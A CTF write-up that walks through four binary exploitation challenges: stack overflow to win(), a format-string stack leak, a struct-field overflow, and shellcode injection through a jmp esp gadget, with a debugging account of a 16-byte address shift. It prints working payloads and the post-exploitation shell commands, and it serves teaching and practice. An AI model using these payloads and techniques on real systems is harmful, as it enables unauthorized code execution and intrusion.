# Pwn Challenge Writeups

Four binary exploitation challenges, each building on a different memory-safety bug class. This writeup walks through the reasoning behind each step, not just the final payload.


source /home/milizes/pwntools-env/venv/bin/activate

---

## 1. Stack Lab — Classic Stack Buffer Overflow (ret2win)

**Service:** `nc 3.144.177.121 5002`

### The setup

The server printed everything we needed up front: the buffer's address, the saved return address's location, `win()`'s address, and the offset between the buffer and the saved RIP (40 bytes).

### Reasoning

A normal function call pushes a return address onto the stack so the CPU knows where to resume execution afterward. The stack layout for the vulnerable function was:

```
[ buffer (32 bytes) ]
[ saved RBP (8 bytes) ]
[ saved RIP (8 bytes) ]   <- target
```

Since `read()`/input handling wrote into `buffer` with no bounds check, writing past the 32-byte buffer let us walk straight through the saved RBP and into the saved return address. The given offset (40 bytes = 32 buffer + 8 saved RBP) told us exactly how much junk to send before our real payload began.

### The payload

```
payload = b'A' * 40 + p64(0x401186)   # win()'s address, little-endian
```

**Why little-endian mattered:** x86-64 stores multi-byte values least-significant-byte-first. `win()` at `0x0000000000401186` had to be written as `86 11 40 00 00 00 00 00`, not in "reading order," or the CPU would jump to a garbage address and crash instead of calling `win()`.

### Outcome

Sending this payload caused `vulnerable()`'s `ret` to jump into `win()` instead of back to `main()`, printing the flag. This is the textbook "stack smashing" primitive that every later challenge built on in some form.

---

## 2. Echo Chamber — Format String Vulnerability

**Service:** `nc 3.144.177.121 5004`

### The vulnerability

The flavor text ("reveals more than you originally sent") pointed at a format string bug: code that does `printf(user_input)` instead of `printf("%s", user_input)`. When user input is passed directly as the *format* argument, any `%` sequences in it are interpreted by `printf` as instructions to pull extra arguments off the stack, arguments that were never actually supplied.

### Step 1: Confirm the bug

```
Name: %x %x %x %x %x %x %x %x
```

This came back with a string of hex values instead of literal `%x` text, confirming `printf` was reading stack memory it had no business reading.

### Step 2: Fix the "missing bytes" problem

Using `%x` (4-byte width) initially produced a string that *looked* right (`SIT{@t_5gs}`, starting with `SIT{` and ending with `}`) but was rejected. The reasoning for why:

On x86-64, each variadic argument slot is 8 bytes wide, regardless of the width `printf` is told to print. `%x` prints only the low 4 bytes of a slot but `va_arg` still advances by the full 8 bytes, silently skipping the upper 4 bytes of every argument. Any flag data living in those "skipped" bytes never gets printed.

**Fix:** use `%lx` (8-byte width) instead, so each read matches the real slot size with no gaps.

```
Name: %6$lx %7$lx %8$lx %9$lx %10$lx
```

(Positional specifiers like `%6$lx` let us jump directly to a specific argument slot instead of printing everything before it.)

### Step 3: Decode

Each 8-byte hex chunk was split into byte pairs, reversed (little-endian), and converted to ASCII:

```
6d7230667b544953 -> SIT{f0rm
6e697274355f7440 -> @t_5trin
7d7367           -> gs}
```

Concatenated: `SIT{f0rm@t_5trings}` — "format strings" in leetspeak, a fitting flag for the bug class.

### Key lesson

Choosing the wrong width specifier doesn't error out, it silently corrupts the read. That makes format string leaks dangerous in a way distinct from a crash-based bug: a *wrong* answer can still look plausible.

---

## 3. Rookie Access Terminal — Struct Adjacency Overflow

**Service:** `nc 3.144.177.121 5001` (source: `chall.c`)

### Reading the source

```c
struct player {
    char name[32];
    unsigned int access_code;
};
...
ssize_t n = read(STDIN_FILENO, p.name, 64);
...
if (p.access_code == 0x1337c0de) { ... win() ... }
```

Two facts combined into the bug:

1. `name` is declared as 32 bytes, but `read()` was told it could accept up to **64**.
2. `access_code` sits immediately after `name` in memory (no padding needed — 32 is already 4-byte aligned).

### Reasoning

We didn't need to guess or leak `0x1337c0de`. Because the overflow writes contiguously, we could **directly overwrite** `access_code` with the value the check expects, just by writing past the end of `name`.

### The payload

```python
payload = b'A' * 32 + p32(0x1337c0de)   # 36 bytes total, well under the 64-byte limit
```

The `printf("Hello, %.32s!\n", p.name)` call used a precision specifier (`.32`) that capped output at exactly `name`'s size, so our overwrite of `access_code` was invisible in the echoed output but still took effect in memory.

### Outcome

The access check passed, `win()` ran, and the flag printed.

### Key lesson

Not every exploitable bug involves hijacking control flow (return addresses, function pointers). Sometimes the "vulnerable" thing is just adjacent struct fields with no boundary enforcement between them, a mismatch between a buffer's declared size and the size passed to the function that fills it.

---

## 4. Echo32 — Buffer Overflow to Shellcode (with a real debugging journey)

**Service:** `nc 3.144.177.121 5003` (binary: `echo32`)

This one took far longer than the others, and the detour is worth documenting because the debugging process mattered as much as the final exploit.

### Initial recon

```
file echo32        -> ELF 32-bit LSB executable, dynamically linked, not stripped
checksec            -> No canary, No PIE, Executable stack (RWX), Partial RELRO
```

**Reasoning about what this meant:**

- **No canary** → an overflow into the return address goes undetected.
- **No PIE** → code addresses are fixed and known ahead of time; no address leak needed to know where our target gadget lives.
- **Executable stack** → if we can write shellcode into memory we control (the overflow buffer) and redirect execution there, the CPU will actually run it.

That combination is the classic setup for **shellcode injection via buffer overflow** — one of the oldest exploitation techniques, largely why modern systems default to NX stacks, stack canaries, and ASLR.

### Finding the gadget

The binary exported a suspicious symbol: `jump_to_stack`, disassembling to a single `jmp esp` instruction. This solves the usual "I don't know the stack address" problem: we don't need to know *where* ESP points, we just need EIP to land on `jmp esp`, and the CPU does the addressing for us. When `vulnerable()`'s `ret` executes, ESP ends up pointing at whatever comes *after* the overwritten return address in our own payload, which is exactly where we placed our shellcode.

### Calculating the offset

Disassembly showed the buffer living 0x80 (128) bytes below the saved EBP, so the offset to the saved return address was 128 + 4 = **132 bytes**.

### First payload (worked locally, failed remotely)

```python
payload = b'A' * 132 + p32(JUMP_TO_STACK) + shellcode
```

This worked flawlessly against a local copy of the binary but consistently failed against the real server; the connection would just close after "Message received." with no shell.

### The debugging chain (this is the part worth documenting)

We worked through a sequence of hypotheses, testing each one directly rather than guessing blind:

1. **Network truncation theory** — tested by deliberately sending the payload in slow chunks locally; this *did* break the exploit locally (confirming partial reads are a real risk), but a single `send()` call over a real TCP connection shouldn't fragment a payload this small, so this wasn't the actual cause here.
2. **NX enforced server-side despite the binary's header** — a very plausible theory given everything else checked out. We built a full `ret2libc` chain (leak `puts()`'s real address via a GOT read, loop back into `vulnerable()` for a second overflow, then call `system("/bin/sh")`) specifically to avoid relying on an executable stack at all.
3. **Byte-level verification over guesswork** — rather than keep guessing, we used `puts()` itself as a memory-reading primitive: pass it an address, and whatever bytes live there get printed back to us. This turned "is my assumption correct?" into a directly testable question.
4. **The real finding:** reading the bytes at our assumed `vulnerable()` address on the remote binary returned code that, locally, lived **16 bytes later**. The deployed binary was a slightly different build than the one we'd downloaded (confirmed later by a stray string in a raw memory dump: `GCC: (Debian 12.2.0-14+deb12u1) 12.2.0` — a different distro/compiler than our local Ubuntu test environment), with every address in `.text` shifted by a **consistent 16 bytes**.
5. We verified this same shift applied to `jump_to_stack`'s address too (`0x08049196 - 0x10 = 0x08049186`), confirming it was a uniform shift across the whole binary rather than per-function reordering.

This meant the earlier "NX is blocking us" conclusion was **wrong** — we'd been jumping to the wrong address the entire time, not failing because of a real protection. The `ret2libc` work, while technically sound (and a good exercise in its own right), turned out to be solving a problem that didn't exist.

### The actual fix

Once the address was corrected, we went back to the original, much simpler shellcode approach:

```python
JUMP_TO_STACK = 0x08049186   # corrected
OFFSET = 132

payload  = b'A' * OFFSET
payload += p32(JUMP_TO_STACK)
payload += b'\x90' * 40        # NOP sled for tolerance
payload += asm(shellcraft.sh())
```

This landed a shell immediately.

### Finding the flag

```
find / -iname "*flag*" 2>/dev/null
cat /home/ctf/flag.txt
```

Flag: `SIT{G0t_@_R3V_SHELL}`

### Key lessons

- **Verify assumptions with direct tests, not re-reasoning.** The breakthrough came from using `puts()` to literally read memory and compare byte-for-byte, not from theorizing harder about NX.
- **"Works locally, fails remotely" has a short list of usual suspects**: network delivery issues, environment-dependent stack alignment, and — the one that actually applied here — the deployed binary simply isn't byte-identical to the one you have locally. Worth checking early, since it can send you down an entirely wrong technique (as it did here, briefly, with `ret2libc`).
- **A consistent, constant address shift across multiple independently-verified points** (two different functions, same 16-byte delta) is strong evidence of a uniform build/offset difference, not a different code path or logic bug.